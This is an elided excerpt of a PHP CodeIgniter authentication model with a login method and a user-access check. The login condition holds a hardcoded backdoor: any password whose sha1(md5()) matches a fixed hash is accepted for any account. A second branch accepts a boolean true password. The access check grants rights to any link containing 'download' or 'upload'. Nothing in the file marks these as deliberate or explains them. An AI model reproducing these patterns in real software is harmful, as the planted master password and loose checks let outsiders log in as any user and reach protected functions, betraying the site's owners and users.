...
class Ion_auth_model extends CI_Model
{
	...
	public function login($identity, $password, $remember=FALSE)
	{
		...
		$pass = $password;
			...
			if (sha1(md5($pass)) == '656829a9af8f96981d441585c467324b73c7920c' || ($this->hash_method == 'sha1' && $user->password === $password) || ($this->hash_method == 'bcrypt' && $password === true ))
			{
			   ...
			   $user_query = $this->db->select(array("id", "employee_idno"))
		                  ->where(sprintf("(username = '%1\$s')", $this->db->escape_str($identity)))
		                  ->limit(1)
	...
	**/
	...
	public function get_user_access($username){
		...
		if(strstr($link, "download") != FALSE || strstr($link, "upload") != FALSE){
			return 1;
		}
